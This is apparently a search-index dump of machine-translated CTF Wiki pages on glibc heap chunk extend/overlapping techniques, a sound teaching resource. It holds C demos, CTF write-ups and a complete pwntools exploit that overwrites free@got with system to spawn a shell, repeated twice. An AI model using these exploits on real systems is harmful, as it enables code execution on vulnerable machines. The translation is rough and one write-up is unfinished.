utilizes the unbin mechanism of smallbin. By modifying the pre_size field, it can be merged across multiple chunks to implement overlapping. HITCON Trainging lab13 \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13 ) Basic Information \u00b6 \u279c hitcontraning_lab13 git: ( master ) file heapcreator heapcreator: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped \u279c hitcontraning_lab13 git: ( master ) checksec heapcreator [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) The program is a 64-bit dynamic linker, which mainly enables Canary protection and NX protection. basic skills \u00b6 The program is probably a custom heap allocator, and each heap has two main members: size and content pointer. The main functions are as follows Create a heap, request the corresponding memory space according to the length entered by the user, and read the specified length content with read. The length is not detected here. When the length is negative, a heap overflow of any length will occur. Of course, the premise is that malloc can be done. In addition, NULL is not set after reading here. Edit the heap, read the specified content according to the specified index and the size of the previously stored heap, but the length read here will be one greater than before, so there will be a vulnerability of off by one**. Show the heap, output the size and content of the specified index heap. Delete the heap, delete the specified heap, and set the corresponding pointer to NULL. Use \u00b6 Basic use ideas are as follows Use the off by one vulnerability to overwrite the size field of the next chunk to construct a fake chunk size. Apply the forged chunk size to create a chunk overlap and modify the key pointer. More specific is to look at the script directly. #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './heapcreator' ) heap = ELF ( './heapcreator' ) libc = ELF ( './libc.so.6' ) def create ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit ( idx , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( content ) def show ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def delete ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"4\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) free_got = 0x602018 create ( 0x18 , \"dada\" ) # 0 create ( 0x10 , & quot ; daa & quot ;) # 1 # overwrite heap 1's struct's size to 0x41 edit ( 0 , \"/bin/sh \\x00 \" + \"a\" * 0x10 + \" \\x41 \" ) # trigger heap 1's struct to fastbin 0x40 # heap 1's content to fastbin 0x20 delete ( 1 ) # new heap 1's struct will point to old heap 1's content, size 0x20 # new heap 1's content will point to old heap 1's struct, size 0x30 # that is to say we can overwrite new heap 1's struct # here we overwrite its heap content pointer to free@got create ( 0x30 , p64 ( 0 ) * 4 + p64 ( 0x30 ) + p64 ( heap . got [ 'free' ])) #1 # leak freeaddr show ( 1 ) r . recvuntil ( \"Content : \" ) data = r . recvuntil ( \"Done !\" ) free_addr = u64 ( data . split ( \" \\n \" )[ 0 ] . ljust ( 8 , \" \\x00 \" )) libc_base = free_addr - libc . symbols [ 'free' ] log . success ( 'libc base addr: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] #gdb.attach(r) # overwrite free@got with system addr edit ( 1 , p64 ( system_addr )) # trigger system(\"/bin/sh\") delete ( 0 ) r . interactive () 2015 hacklu bookstore \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore ) Basic Information \u00b6 \u279c 2015_hacklu_bookstore git: ( master ) file books books: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped \u279c 2015_hacklu_bookstore git: ( master ) checksec books [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program is a dynamically linked 64-bit program, which mainly enables Canary and NX protection. basic skills \u00b6 The main function of the program is the book, as follows You can order up to two books. Choose to order the first few books according to the number, you can add the corresponding name for each book. However, a vulnerability of any length heap overflow occurred at the name added. Delete order according to the number, but here it is simply free, and is not set to NULL, so there will be a vulnerability after use after free. Submit an order to put the names of the two books together. Here, due to the above heap overflow problem, there will also be a heap overflow vulnerability. In addition, there is a Format String Vulnerability before the program exits. Although the vulnerability of the program is very strong here, the size of all the malloc is completely fixed, we can only use these allocated chunks to operate. Using ideas \u00b6 The main vulnerabilities in the program are heap overflow and format string vulnerabilities, but if you want to exploit the format string vulnerability, you will need to overflow the corresponding dest array. The specific ideas are as follows Use chunk overflow to perform chunk extend, so that when malloc(0x140uLL) is in submit, it just returns the position of the second order. Before the submit, lay out the heap memory layout so that the string can be overlaid to just the specified format string. By constructing dest as the specified format string: on the one hand, the address of __libc_start_main_ret is leaked, on the one hand, the control program returns to execution . At this point, you can know the libc base address, system and other addresses. It should be noted that since the program will directly exit immediately after submit, our better idea is to modify the variables in fini_array so that after the program is executed, return to the position we expect . Here we will use a trick, the program will read 128 size each time it reads the selection, on the stack. When the program finally outputs dest, the part of the selection that was previously read must be on the stack, so if we pre-arrange some control flow pointers on the stack, we can control the execution flow of the program. Re-use the format string vulnerability and override free@got as the system address to achieve arbitrary command execution. Here, the offset of each parameter is Fini_array0: 5 + 8 = 13 __libc_start_main_ret : 5+0x1a=31\u3002 00:0000\u2502 rsp 0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov eax, 0 01:0008\u2502 0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000 02:0010\u2502 0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 03:0018\u2502 0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop rcx 04:0020\u2502 0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ('%sffffff') 05:0028\u2502 0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 06: 0030\u2502 0x7ffe6a7f3ef8 -\u25b8 0x9f2130 \u25c2- 0x6564724f203a3220 (&#39;2: Order&#39;) 07:0038\u2502 0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* '5\\n' */ 08:0040\u2502 0x7ffe6a7f3f08 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000 0c:0060\u2502 0x7ffe6a7f3f28 \u25c2\u2014 0x0 ... \u2193 0f:0078\u2502 0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* 'ttime' */ 10:0080\u2502 0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ('vdso_get') 11:0088\u2502 0x7ffe6a7f3f50 \u25c2\u2014 0x1 12:0090\u2502 0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add rbx, 1 13: 0098\u2502 0x7ffe6a7f3f60 \u25c2- 0x0 ... \u2193 15:00a8\u2502 0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 16:00b0\u2502 0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor ebp, ebp 17:00b8\u2502 0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1 18: 00c0 0x 0x7ffe6a7f3f88 \u25c2- 0xd8d379f22453ff00 19:00c8\u2502 rbp 0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 1a:00d0\u2502 0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax ! ! ! To be added! ! ! topic \u00b6 2016 Nuit du Hack CTF Quals : night deamonic heap","title":"Chunk Extend/Overlapping"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#chunk-extend-and-overlapping","text":"","title":"Chunk Extend and Overlapping"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#introduction","text":"Chunk extend is a common use of heap vulnerabilities. The effect of chunk overlapping can be achieved by extend. This method of utilization requires the following timing and conditions: There is a heap-based vulnerability in the program Vulnerabilities can control data in chunk headers","title":"Introduction"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#principle","text":"The chunk extend technique can be generated by the various macros that ptmalloc uses when working with heap chunks. In ptmalloc, the operation of getting the chunk size is as follows /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) One is to directly get the size of the chunk, not to ignore the mask part, and the other is to ignore the mask part. In ptmalloc, the operation of getting the next chunk block address is as follows /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) That is, use the current block pointer plus the current block size. In ptmalloc, the operation of getting the previous chunk information is as follows /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) That is, the size of the previous block is obtained by malloc_chunk->prev_size, and then the obtained size is subtracted from the chunk address. In ptmalloc, the operation of determining whether the current chunk is in the use state is as follows: #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) That is, look at the prev_inuse field of the next chunk, and the next block address is calculated according to the size of the current chunk as we mentioned earlier. See the section \"Heap related data structures\" for more details. As can be seen from the above macros, ptmalloc uses the chunk header data to determine the usage of the chunk and to locate the chunks before and after the chunk. In short, chunk extend is achieved by controlling the size and pre_size fields to achieve overlapping operations. Similar to chunk extend, there is an operation called chunk shrink. Only the use of chunk extend is introduced here.","title":"Principle"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-1-extend-the-fastbin-of-inuse","text":"In simple terms, the effect of this utilization is to control the content of the second block by changing the size of the first block. Note that our examples are all in 64-bit programs. If you want to test under 32 bits, you can change the 8-byte offset to 4 bytes . int main(void) { void * ptr, * ptr1; Ptr=malloc(0x10);//Assign the first 0x10 chunk Malloc (0x10); / / assign a second 0x10 chunk *(long long *)((long long)ptr-0x8)=0x41;// Modify the size field of the first block free(ptr); Ptr1=malloc(0x30);// Implement extend to control the content of the second block return 0; } When two malloc statements are executed, the heap's memory is distributed as follows 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <=== top chunk After that, we changed the size field of chunk1 to 0x41, which is because the size field of the chunk contains the size of the user control and the size of the header. As shown above, the size is exactly 0x40. This step can be obtained from heap overflow in the title. 0x602000: 0x0000000000000000 0x0000000000000041 &lt;=== Tamper size 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 After executing free, we can see that chunk2 and chunk1 are combined into a 0x40 chunk and released. Fastbins[idx=0, size=0x10] 0x00 Fastbins[idx=1, size=0x20] 0x00 Fastbins[idx=2, size=0x30] \u2190 Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00 Fastbins[idx=4, size=0x50] 0x00 Fastbins[idx=5, size=0x60] 0x00 Fastbins[idx=6, size=0x70] 0x00 Then we get the block of chunk1+chunk2 through malloc (0x30), then we can directly control the contents of chunk2, we also call this state the overlapping chunk. call 0x400450 <malloc@plt> mov QWORD PTR [rbp-0x8], rax rax = 0x602010","title":"Basic example 1: Extend the fastbin of inuse"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-2-extend-the-smallbin-of-inuse","text":"Through a deep understanding of the implementation part of the heap, we know that the chunks in the fastbin range will be placed in the fastbin list, and the chunks that are not in this range will be placed in the unsorted bin list. In the following example, we use the size 0x80 to allocate the heap (as a comparison, the default maximum chunk for fastbin can be used as 0x70) int main() { void * ptr, * ptr1; Ptr=malloc(0x80);//Assign the first chunk1 of 0x80 Malloc (0x10); / / allocate the second 0x10 chunk2 Malloc (0x10); / / prevent merger with top chunk * (int *) ((int) ptr-0x8) = 0xb1; free(ptr); ptr1=malloc(0xa0); } In this example, because the allocated size is not in the range of fastbin, if it is connected to the top chunk when it is released, it will merge with the top chunk. So we need to allocate an additional chunk to separate the released chunk from the top chunk. 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;===chunk1 tamper with the size field 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 &lt;=== Prevent merged chunks 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk After release, chunk1 swallows the contents of chunk2 and puts them together into the unsorted bin. 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== was put into the unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 &lt;=== Note that this is marked as empty 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) When the allocation is made again, the chunk1 and chunk2 spaces are retrieved, and we can control the contents of chunk2. 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010","title":"Basic example 2: Extend the smallbin of inuse"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-3-extend-the-free-smallbin","text":"Example 3 is based on Example 2, this time we release chunk1 and then modify the size field of chunk1 in the unsorted bin. int main() { void * ptr, * ptr1; Ptr=malloc(0x80);//Assign the first chunk1 of 0x80 Malloc (0x10); / / assign the second 0x10 chunk2 Free(ptr);//First release, so that chunk1 enters unsorted bin * (int *) ((int) ptr-0x8) = 0xb1; ptr1=malloc(0xa0); } The results after two malloc are as follows 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 We first release chunk1 to make it into the unsorted bin. unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== Entering unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk Then tamper with the size field of chunk1 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== size field was tampered with 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 At this point, the malloc allocation can be used to get the chunk of chunk1+chunk2, thus controlling the content of chunk2.","title":"Basic example 3: Extend the free smallbin"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#chunk-extendshrink-what-can-i-do","text":"In general, this technique does not directly control the execution flow of the program, but it can control the contents of the chunk. If chunks have string pointers, function pointers, etc., they can be used to leak information and control the execution flow. In addition, chunk overlap can be realized by extend, and the fd/bk pointer of the chunk can be controlled by overlapping, so that the use of fastbin attack can be realized.","title":"Chunk Extend/Shrink What can I do?"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-4-overlapping-after-extend","text":"Here we show backward overlapping through extend, which is also the most common case in CTF, and other uses can be achieved through overlay. int main() { void * ptr, * ptr1; Ptr=malloc(0x10);//Assign the first 0x80 chunk1 Malloc (0x10); / / allocate the second 0x10 chunk2 Malloc (0x10); / / allocate the third 0x10 chunk3 Malloc (0x10); / / allocate the 4th 0x10 chunk4 * (int *) ((int) ptr-0x8) = 0x61; free(ptr); ptr1=malloc(0x50); } After the malloc (0x50) re-occupies the extend area, the 0x10 fastbin block can still be allocated and released normally. At this time, the overlay is already formed, and the fastbin attack can be realized by performing the operation on the overlapping.","title":"Basic example 4: Overlapping after extend"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-5-forwarding-through-extend","text":"This shows that the previous block is merged by modifying the pre_inuse field and the pre_size field. int main(void) { void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 Malloc (0x10); / / prevent merge with top free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//Modify the pre_inuse field *(int *)((long long)ptr4-0x10)=0xd0;//Modify the pre_size field Free(ptr4);//unlink for forward extend Malloc (0x150); / / placeholder block } The forward extend utilizes the unbin mechanism of smallbin. By modifying the pre_size field, it can be merged across multiple chunks to implement overlapping.","title":"Basic example 5: Forwarding through extend"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#hitcon-trainging-lab13","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13 )","title":"HITCON Trainging lab13"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-information","text":"\u279c hitcontraning_lab13 git: ( master ) file heapcreator heapcreator: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped \u279c hitcontraning_lab13 git: ( master ) checksec heapcreator [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) The program is a 64-bit dynamic linker, which mainly enables Canary protection and NX protection.","title":"Basic Information"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-skills","text":"The program is probably a custom heap allocator, and each heap has two main members: size and content pointer. The main functions are as follows Create a heap, request the corresponding memory space according to the length entered by the user, and read the specified length content with read. The length is not detected here. When the length is negative, a heap overflow of any length will occur. Of course, the premise is that malloc can be done. In addition, NULL is not set after reading here. Edit the heap, read the specified content according to the specified index and the size of the previously stored heap, but the length read here will be one greater than before, so there will be a vulnerability of off by one**. Show the heap, output the size and content of the specified index heap. Delete the heap, delete the specified heap, and set the corresponding pointer to NULL.","title":"basic skills"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#use","text":"Basic use ideas are as follows Use the off by one vulnerability to overwrite the size field of the next chunk to construct a fake chunk size. Apply the forged chunk size to create a chunk overlap and modify the key pointer. More specific is to look at the script directly. #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './heapcreator' ) heap = ELF ( './heapcreator' ) libc = ELF ( './libc.so.6' ) def create ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit ( idx , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( content ) def show ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def delete ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"4\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) free_got = 0x602018 create ( 0x18 , \"dada\" ) # 0 create ( 0x10 , & quot ; daa & quot ;) # 1 # overwrite heap 1's struct's size to 0x41 edit ( 0 , \"/bin/sh \\x00 \" + \"a\" * 0x10 + \" \\x41 \" ) # trigger heap 1's struct to fastbin 0x40 # heap 1's content to fastbin 0x20 delete ( 1 ) # new heap 1's struct will point to old heap 1's content, size 0x20 # new heap 1's content will point to old heap 1's struct, size 0x30 # that is to say we can overwrite new heap 1's struct # here we overwrite its heap content pointer to free@got create ( 0x30 , p64 ( 0 ) * 4 + p64 ( 0x30 ) + p64 ( heap . got [ 'free' ])) #1 # leak freeaddr show ( 1 ) r . recvuntil ( \"Content : \" ) data = r . recvuntil ( \"Done !\" ) free_addr = u64 ( data . split ( \" \\n \" )[ 0 ] . ljust ( 8 , \" \\x00 \" )) libc_base = free_addr - libc . symbols [ 'free' ] log . success ( 'libc base addr: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] #gdb.attach(r) # overwrite free@got with system addr edit ( 1 , p64 ( system_addr )) # trigger system(\"/bin/sh\") delete ( 0 ) r . interactive ()","title":"Use"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#2015-hacklu-bookstore","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore )","title":"2015 hacklu bookstore"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-information_1","text":"\u279c 2015_hacklu_bookstore git: ( master ) file books books: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped \u279c 2015_hacklu_bookstore git: ( master ) checksec books [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program is a dynamically linked 64-bit program, which mainly enables Canary and NX protection.","title":"Basic Information"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-skills_1","text":"The main function of the program is the book, as follows You can order up to two books. Choose to order the first few books according to the number, you can add the corresponding name for each book. However, a vulnerability of any length heap overflow occurred at the name added. Delete order according to the number, but here it is simply free, and is not set to NULL, so there will be a vulnerability after use after free. Submit an order to put the names of the two books together. Here, due to the above heap overflow problem, there will also be a heap overflow vulnerability. In addition, there is a Format String Vulnerability before the program exits. Although the vulnerability of the program is very strong here, the size of all the malloc is completely fixed, we can only use these allocated chunks to operate.","title":"basic skills"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#using-ideas","text":"The main vulnerabilities in the program are heap overflow and format string vulnerabilities, but if you want to exploit the format string vulnerability, you will need to overflow the corresponding dest array. The specific ideas are as follows Use chunk overflow to perform chunk extend, so that when malloc(0x140uLL) is in submit, it just returns the position of the second order. Before the submit, lay out the heap memory layout so that the string can be overlaid to just the specified format string. By constructing dest as the specified format string: on the one hand, the address of __libc_start_main_ret is leaked, on the one hand, the control program returns to execution . At this point, you can know the libc base address, system and other addresses. It should be noted that since the program will directly exit immediately after submit, our better idea is to modify the variables in fini_array so that after the program is executed, return to the position we expect . Here we will use a trick, the program will read 128 size each time it reads the selection, on the stack. When the program finally outputs dest, the part of the selection that was previously read must be on the stack, so if we pre-arrange some control flow pointers on the stack, we can control the execution flow of the program. Re-use the format string vulnerability and override free@got as the system address to achieve arbitrary command execution. Here, the offset of each parameter is Fini_array0: 5 + 8 = 13 __libc_start_main_ret : 5+0x1a=31\u3002 00:0000\u2502 rsp 0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov eax, 0 01:0008\u2502 0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000 02:0010\u2502 0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 03:0018\u2502 0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop rcx 04:0020\u2502 0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ('%sffffff') 05:0028\u2502 0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 06: 0030\u2502 0x7ffe6a7f3ef8 -\u25b8 0x9f2130 \u25c2- 0x6564724f203a3220 (&#39;2: Order&#39;) 07:0038\u2502 0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* '5\\n' */ 08:0040\u2502 0x7ffe6a7f3f08 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000 0c:0060\u2502 0x7ffe6a7f3f28 \u25c2\u2014 0x0 ... \u2193 0f:0078\u2502 0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* 'ttime' */ 10:0080\u2502 0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ('vdso_get') 11:0088\u2502 0x7ffe6a7f3f50 \u25c2\u2014 0x1 12:0090\u2502 0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add rbx, 1 13: 0098\u2502 0x7ffe6a7f3f60 \u25c2- 0x0 ... \u2193 15:00a8\u2502 0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 16:00b0\u2502 0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor ebp, ebp 17:00b8\u2502 0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1 18: 00c0 0x 0x7ffe6a7f3f88 \u25c2- 0xd8d379f22453ff00 19:00c8\u2502 rbp 0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 1a:00d0\u2502 0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax ! ! ! To be added! ! !","title":"Using ideas"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#topic","text":"2016 Nuit du Hack CTF Quals : night deamonic heap","title":"topic"},{"location":"pwn/linux/glibc-heap/heap_overview/","text":"\u5806 overview \u00b6 What is a heap? \u00b6 The heap can provide dynamically allocated memory while the program is running, allowing the program to request memory of unknown size. The heap is actually a continuous linear region of the program virtual address space, which grows from a low address to a high address. We generally refer to the part of the program that manages the heap as the heap manager. The heap manager is in the middle of the user program and the kernel, mainly doing the following work. In response to the user's request for a memory request, request memory from the operating system and return it to the user program. At the same time, in order to maintain the efficiency of memory management, the kernel generally pre-allocates a large piece of contiguous memory, and then let the heap manager manage the memory through some algorithm. The heap manager will interact with the operating system again only if there is insufficient heap space. Manage the memory released by the user. In general, the memory released by the user is not directly returned to the operating system, but is managed by the heap manager. These released memory can respond to requests from the user for newly requested memory. Early heap allocation and reclamation in Linux was implemented by Doug Lea, but it shared the heap memory space of the process when it processed multiple threads in parallel. 